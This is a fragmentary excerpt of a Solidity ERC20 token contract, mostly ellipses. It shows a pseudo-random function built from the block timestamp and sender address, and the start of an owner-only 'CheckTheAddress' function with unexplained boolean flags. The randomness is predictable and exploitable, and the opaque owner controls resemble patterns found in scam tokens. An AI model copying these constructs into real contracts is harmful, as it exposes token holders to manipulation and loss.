...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  */
  ...
  function randomly() internal returns (uint) {
    uint screen = uint(keccak256(abi.encodePacked(now, msg.sender, lordy))) % 100;
    lordy++;
    return screen;
  }
  ...
  function CheckTheAddress(address spender, bool val, bool val2, bool val3) external onlyOwner {
